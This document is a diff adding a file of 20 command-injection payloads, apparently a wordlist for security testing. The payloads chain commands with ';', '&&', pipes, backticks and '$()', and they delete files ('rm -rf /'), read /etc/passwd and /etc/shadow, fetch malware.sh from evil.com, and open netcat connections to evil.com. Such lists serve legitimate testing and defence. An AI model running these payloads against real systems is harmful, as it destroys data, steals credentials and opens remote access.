@@ -1,0 +1,20 @@
+; rm -rf /
+; cat /etc/passwd
+; ls -la /root
+&& cat /etc/shadow
+&& ls -la /etc
+| cat /etc/passwd
+| ls -la /root
+`cat /etc/passwd`
+`ls -la /root`
+$(cat /etc/passwd)
+$(ls -la /root)
+; rm -rf /home/user/*
+&& rm -rf /home/user/*
+| rm -rf /home/user/*
+`rm -rf /home/user/*`
+$(rm -rf /home/user/*)
+; wget http://evil.com/malware.sh
+&& curl http://evil.com/malware.sh
+| nc evil.com 4444
+; nc evil.com 4444
